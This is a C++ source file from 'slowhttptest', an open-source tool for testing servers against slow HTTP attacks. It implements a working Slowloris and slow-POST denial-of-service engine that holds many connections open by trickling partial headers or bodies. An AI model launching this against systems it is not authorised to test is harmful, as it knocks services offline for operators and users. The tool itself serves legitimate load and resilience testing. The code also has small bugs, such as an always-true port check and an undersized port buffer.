/*****************************************************************************
*  Copyright 2011 Sergey Shekyan
*
*  Licensed under the Apache License, Version 2.0 (the "License");
*  you may not use this file except in compliance with the License.
*  You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
* *****************************************************************************/

/*****
 * Author: Sergey Shekyan sshekyan@qualys.com
 *
 * Slow HTTP attack  vulnerability test tool
 *  http://code.google.com/p/slowhttptest/
 *****/
#include "config.h"
#include "slowhttptest.h"

#include <errno.h>
#include <cmath>
#include <stdio.h>

#include <string>
#include <vector>
#include <sstream>

#include <netdb.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/resource.h>

#include "slowlog.h"
#include "slowsocket.h"
#include "slowhttptest.h"

namespace {
static const int kBufSize = 65537;
// update ExitStatusTupe too
static const char* exit_status_msg[] = {
  "Hit test time limit",
  "No open connections left",
  "Cannot esatblish connection",
  "Connection refused"
};
static const char* user_agents[] = {
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) "
   "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
   "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) "
   "Gecko/20100101 Firefox/5.0.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) "
   "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
  "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
   "Presto/2.9.168 Version/11.50",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
};
static const char post_request[] = "Connection: close\r\n"
    "Referer: http://code.google.com/p/slowhttptest/\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Accept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n\r\n"
    "foo=bar";
// per RFC 2616 section 4.2, header can be any US_ASCII character (0-127),
// but we'll start with X-
static const char header_prefix[] = "X-";
static const char header_separator[] = ": ";

static const char body_prefix[] = "&";
static const char body_separator[] = "=";
static const char crlf[] = "\r\n";
static const char symbols[] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
}  // namespace

namespace slowhttptest {
SlowHTTPTest::SlowHTTPTest(int delay, int duration, 
 int interval, int con_cnt, int max_random_data_len,
 int content_length, SlowTestType type) :
  delay_(delay)
  ,duration_(duration)
  ,followup_timing_(interval)
  ,followup_cnt_(duration_ / followup_timing_)
  ,num_connections_(con_cnt)
  ,extra_data_max_len_(max_random_data_len)
  ,seconds_passed_(0)
  ,content_length_(content_length)
  ,type_(type)
{
}

SlowHTTPTest::~SlowHTTPTest() {
  freeaddrinfo(addr_);
}

bool SlowHTTPTest::change_fd_limits() {
  rlimit fd_limit = {0, 0};
  if(getrlimit(RLIMIT_NOFILE, &fd_limit)) {
    slowlog(LOG_ERROR, "error getting limits for open files: %s\n", strerror(errno));
    return false;
  }
  // +3 is stdin, stdout, stderr  
  if(fd_limit.rlim_cur != RLIM_INFINITY && fd_limit.rlim_cur < (unsigned)(num_connections_ + 3)) { //extend limits
    if(fd_limit.rlim_max == RLIM_INFINITY || fd_limit.rlim_max > (unsigned)(num_connections_ + 3)) {
      fd_limit.rlim_cur = num_connections_ + 3;
    } else { // max limit is lower than requested
      fd_limit.rlim_cur = fd_limit.rlim_max;
      num_connections_ = fd_limit.rlim_max - 3;
      slowlog(LOG_WARN, "decreasing target connection number to %d\n", num_connections_);
    }
    if(setrlimit(RLIMIT_NOFILE, &fd_limit)) {
      slowlog(LOG_ERROR, "error setting limits for open files: %s\n", strerror(errno));
      return false;
    } else {
      slowlog(LOG_INFO, "set open files limit to %d\n", fd_limit.rlim_cur);
    }
  }
  
  return true;
}
const char* SlowHTTPTest::get_random_extra() {
  size_t name_len = 0;
  size_t value_len = 0;

  while(name_len == 0) name_len= rand() % ((extra_data_max_len_ - 1)/2);
  while(value_len == 0) value_len= rand() % ((extra_data_max_len_ -1)/2);
  random_extra_.clear();
  random_extra_.append(prefix_);
  while(name_len) {
    // -1 is for not including trailing \0 in symbols
    random_extra_.push_back(symbols[rand() % (sizeof(symbols)/sizeof(*symbols) - 1)]); 
    --name_len;
  }
  random_extra_.append(separator_);
  while(value_len) {    
    random_extra_.push_back(symbols[rand() % (sizeof(symbols)/sizeof(*symbols) - 1)]);  
    --value_len;
  }
  if(postfix_) {
    random_extra_.append(postfix_);
  }
  return random_extra_.c_str();
}

bool SlowHTTPTest::init(const char* url) {
  if(!change_fd_limits()) {
    slowlog(LOG_ERROR, "error setting open file limits\n");
  }
  if(!base_uri_.prepare(url)) {
    slowlog(LOG_FATAL, "Error parsing URL\n");
    return false;
  }
  
  int error;
  addrinfo hints;
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = PF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  /* resolve the domain name into a list of addresses */
  error = getaddrinfo(base_uri_.getHost().c_str(), base_uri_.getPortStr(), &hints, &addr_);
  if(error != 0) {
    slowlog(LOG_FATAL, "Error in getaddrinfo: %s\n", gai_strerror(error));
    return false;
  }
  random_extra_.resize(extra_data_max_len_);
  user_agent_.append(user_agents[rand() % sizeof(user_agents)/sizeof(*user_agents)]);
  request_.clear();
  if(eHeader == type_) {
    separator_ = header_separator;
    prefix_ = header_prefix;
    postfix_ = crlf;
    request_.append("GET ");
  } else {
    separator_ = body_separator;
    prefix_ = body_prefix;
    postfix_ = 0;
    request_.append("POST ");
  }

  request_.append(base_uri_.getPath());
  request_.append(" HTTP/1.1\r\n");
  request_.append("Host: ");
  request_.append(base_uri_.getHost());

  if(base_uri_.getPort() != 80 || base_uri_.getPort() != 443) {
    request_.append(":");
    char buf[4];
    sprintf(buf, "%d", base_uri_.getPort());
    request_.append(buf);
  }

  request_.append("\r\n");
  request_.append("User-Agent: ");
  request_.append(user_agent_);
  request_.append("\r\n");
  if(ePost == type_) {
    request_.append("Content-Length: ");
    std::stringstream ss;
    ss << content_length_;
    request_.append(ss.str());
    request_.append("\r\n");
    request_.append(post_request);
  }
  report_parameters();
  return true;
}

void SlowHTTPTest::close_sock(int id) {
  sock_[id]->close();
}

void SlowHTTPTest::report_parameters() {

  slowlog(LOG_INFO, "\nUsing:\n"
    "test mode:                        %s\n"
    "URL:                              %s\n"
    "number of connections:            %d\n"
    "Content-Length header value       %d\n"
    "interval between follow up data:  %d seconds\n"
    "connections per seconds:          %d\n"
    "test duration:                    %d seconds\n"
    , type_?"POST":"headers"
    , base_uri_.getData()
    , num_connections_
    , content_length_
    , followup_timing_
    , delay_
    , duration_
  );
}

void SlowHTTPTest::report_status() {
  initializing_ = 0;
  connecting_ = 0; 
  connected_ = 0; 
  errored_ = 0; 
  closed_ = 0;

  std::vector<SlowSocket*>::iterator it;
  SocketState state;
  for(it = sock_.begin(); it < sock_.end(); ++it) {
    if((*it)) {
      state = (*it)->get_state();
      switch(state) {
        case eInit:
          ++initializing_;
          break;
        case eConnecting:
          ++connecting_;
          break;
        case eConnected:
          ++connected_;
          break;
        case eError:
          ++errored_;
          break;
        case eClosed:
          ++closed_;
          break;
        default:
          break;
       }
    }
  }

  slowlog(LOG_INFO, "slow HTTP test status on %dth second:\n"
   "inititalizing       %d\n"
   "connecting          %d\n"
   "connected           %d\n"
   "error               %d\n"
   "closed              %d\n"
   , seconds_passed_
   , initializing_
   , connecting_
   , connected_
   , errored_
   , closed_);

}
void SlowHTTPTest::report_final() {
  long res = 0;
  long a = 0;
  long b = 0;
  long c = 0;
  // if socket still open, set close time to now
  timeval t;
  gettimeofday(&t, 0);
  long n = (t.tv_sec * 1000) + (t.tv_usec / 1000);
  std::vector<SlowSocket*>::iterator it;
  for(it = sock_.begin(); it < sock_.end(); ++it) {
    a = (*it)->get_start();
    b = (*it)->get_connected();
    c = (*it)->get_stop() ? (*it)->get_stop() : n;
    if(a && b) {
      res = b - a;
      slowlog(LOG_INFO, "CONNECT TIME IS %ld\n", res);
    }
    if(c && a) {
      res = c - a;
      slowlog(LOG_INFO, "LIFE TIME IS %ld\n", res);
    }
  }   
  slowlog(LOG_INFO, "Test ended on %dth second with status: %s\n",
    seconds_passed_, exit_status_msg[exit_status_]);
}
bool SlowHTTPTest::run_test() {
  int num_connected = 0;
  fd_set readfds, writefds;
  int maxfd = 0;
  int result = 0;
  int ret = 0;
  timeval now, timeout, start, progress_timer, 
          tv_delay, sock_start_time, sock_connected_time,
          sock_stop_time;

  // connection rate per second
  tv_delay.tv_sec = 0;
  tv_delay.tv_usec = 1000000 / delay_; 
  int active_sock_num;
  char buf[kBufSize];
  const char* extra_data;
  int heartbeat_reported = 1; //trick to print 0 sec hb  
  timerclear(&now);
  timerclear(&timeout);
  timerclear(&progress_timer);
  timerclear(&sock_start_time);
  timerclear(&sock_connected_time);
  timerclear(&sock_stop_time);
  gettimeofday(&start, 0);
  sock_.resize(num_connections_);

  // select loop
  while(true) {
    int wr = 0;
    active_sock_num = 0;
    if(num_connected < num_connections_) {
      sock_[num_connected] = new SlowSocket();
      sock_[num_connected]->set_state(eInit);
      if(!sock_[num_connected]->init(addr_, &base_uri_, maxfd,
          followup_cnt_)) {
        sock_[num_connected]->set_state(eError);
        slowlog(LOG_ERROR, "%s: Unable to initialize %dth slow  socket.\n", __FUNCTION__,
            (int) num_connected);
        num_connections_ = num_connected;
      } else {
        sock_[num_connected]->set_state(eConnecting);
        gettimeofday(&sock_start_time, 0);
        sock_[num_connected]->set_start(&sock_start_time);
        ++num_connected;
      }
    }
    seconds_passed_ = progress_timer.tv_sec;
    FD_ZERO(&readfds);
    FD_ZERO(&writefds);
    for(int i = 0; i < num_connected; ++i) {
      if(sock_[i] && sock_[i]->get_sockfd() > 0) {
        FD_SET(sock_[i]->get_sockfd(), &readfds);
        ++active_sock_num;
        if(sock_[i]->get_requests_to_send() > 0) {
          ++wr;
          FD_SET(sock_[i]->get_sockfd(), &writefds);
        } else if(sock_[i]->get_followups_to_send() > 0
            && (seconds_passed_ > 0 && seconds_passed_ % followup_timing_ == 0)) {
          if(sock_[i]->get_last_followup_timing() != seconds_passed_) {
            sock_[i]->set_last_followup_timing(seconds_passed_);
            ++wr;
            FD_SET(sock_[i]->get_sockfd(), &writefds);
          }
        }
      }
    }
    if(seconds_passed_ % 5 == 0) { // printing heartbeat
      if(heartbeat_reported != seconds_passed_) { // once
        report_status();
        heartbeat_reported = seconds_passed_;
      }
    }
    if(seconds_passed_ > duration_) { // hit time limit
      exit_status_ = eTimeLimit;
      break;
    }
    // rude way to detect if something is wrong after 10 seconds
    if(seconds_passed_ > 10 && connected_ == 0) {
      if(connecting_ > 0 && closed_ == 0) {
        exit_status_ = eHostNotAlive;
      } else if (closed_ > 0 && connecting_ >=0) {
        exit_status_ = eConnectionRefused;
      }
      break;
    }
    // no open connections
    if(active_sock_num == 0) {
      exit_status_ = eAllClosed;
      break;
    }
    // do not block if have new connections to establish
    timeout.tv_sec = (num_connected < num_connections_)? 0 : 1;
    timeout.tv_usec = 0; //microseconds

    result = select(maxfd + 1, &readfds, wr ? &writefds : NULL, NULL,
     &timeout);
    gettimeofday(&now, 0);
    timersub(&now, &start, &progress_timer);
    if(result < 0) {
      slowlog(LOG_FATAL, "%s: selecd < num_connections_error: %s\n", __FUNCTION__, strerror(errno));
      break;
    } else if(result == 0) {
      // nothing to monitor
      //continue;
    } else {
      for(int i = 0; i < num_connected; i++) {
        if(sock_[i] && sock_[i]->get_sockfd() > 0) {
          if(FD_ISSET(sock_[i]->get_sockfd(), &readfds)) { // read
            ret = sock_[i]->recv_slow(buf, kBufSize);
            buf[ret] = '\0';
            if(ret <= 0 && errno != EAGAIN) {
              sock_[i]->set_state(eClosed);
              gettimeofday(&sock_stop_time, 0);
              sock_[i]->set_stop(&sock_stop_time);
              slowlog(LOG_DEBUG, "%s: socket %d closed: %s\n", __FUNCTION__,
                  sock_[i]->get_sockfd(),
                  strerror(errno));
              close_sock(i);
              continue;
            } else {
              if(ret > 0) {// actual data recieved
                slowlog(LOG_DEBUG, "%s: sock %d replied %s\n", __FUNCTION__,
                    sock_[i]->get_sockfd(), buf);
              } else {
                // still in connect phase
                //slowlog(LOG_DEBUG, "socket %d rd status:%s\n",
                //    (int)sock_[i]->get_sockfd(),
                //    strerror(errno));
              }
            }
          }
          if(FD_ISSET(sock_[i]->get_sockfd(), &writefds)) { // write
            if(sock_[i]->get_requests_to_send() > 0) {
              ret = sock_[i]->send_slow(request_.c_str(),
                  request_.size());
              if(ret <= 0 && errno != EAGAIN) {
                sock_[i]->set_state(eClosed);
                gettimeofday(&sock_stop_time, 0);
                sock_[i]->set_stop(&sock_stop_time);
                slowlog(LOG_DEBUG,
                    "%s:error sending initial slow request on socket %d:\n%s\n",
                    __FUNCTION__, sock_[i]->get_sockfd(),
                    strerror(errno));
                close_sock(i);
                continue;
              } else {
                if(ret > 0) { //actual data was sent
                  sock_[i]->set_state(eConnected);
                  gettimeofday(&sock_connected_time, 0);
                  sock_[i]->set_connected(&sock_connected_time);
                  slowlog(LOG_DEBUG,
                      "%s:initial %d of %d bytes sent on socket %d:\n%s\n",
                      __FUNCTION__, ret,
                      (int) request_.size(),
                      (int) sock_[i]->get_sockfd(),
                      request_.c_str());
                } else {
                  // still in connect phase
                  //slowlog(LOG_DEBUG, "socket %d wr status:%s\n",
                  //    (int)sock_[i]->get_sockfd(),
                  //    strerror(errno));
                }
              }
            } else if(sock_[i]->get_followups_to_send() > 0
                && (seconds_passed_ > 0
                    && seconds_passed_ % followup_timing_ == 0)) {
              extra_data = get_random_extra();
              ret = sock_[i]->send_slow(extra_data,
                  strlen(extra_data), eFollowUpSend);
              if(ret <= 0 && errno != EAGAIN) {
                sock_[i]->set_state(eClosed);
                gettimeofday(&sock_stop_time, 0);
                sock_[i]->set_stop(&sock_stop_time);
                slowlog(LOG_DEBUG,
                    "%s:error sending follow up data on socket %d:\n%s\n",
                    __FUNCTION__, sock_[i]->get_sockfd(),
                    strerror(errno));
                close_sock(i);
                continue;
              } else {
                if(ret > 0) { //actual data was sent
                  slowlog(LOG_DEBUG,
                      "%s:%d of %d follow up data sent on socket %d:\n%s\n%d follow ups left\n",
                        __FUNCTION__, ret,
                        (int) strlen(extra_data),
                        (int) sock_[i]->get_sockfd(),
                        extra_data,
                        sock_[i]->get_followups_to_send());
                } else {
                  // still in connect phase
                  // slowlog(LOG_DEBUG, "socket %d wr status:%s\n",
                  //     (int)sock_[i]->get_sockfd(),
                  //     strerror(errno));
                }
              }
            }
          } else {
            // if(sock_[i] && sock_[i]->get_requests_to_send() > 0) {
              // trying to connect, server slowing down probably
            //  slowlog(LOG_WARN, "pending connection on socket %d\n", sock_[i]->get_sockfd());
            //}
          }
        }
      }
    }
    
    if(num_connected < num_connections_) {
      // throttle down conenction rate, assume connect() returned immediately
      usleep(tv_delay.tv_usec);
    }
  }
  report_final();
  for(int i = 0; i < num_connections_; ++i) {
    if(sock_[i]) {
      delete sock_[i];
    }
  }
  sock_.clear();

  return true;
}
}  // namespace slowhttptest
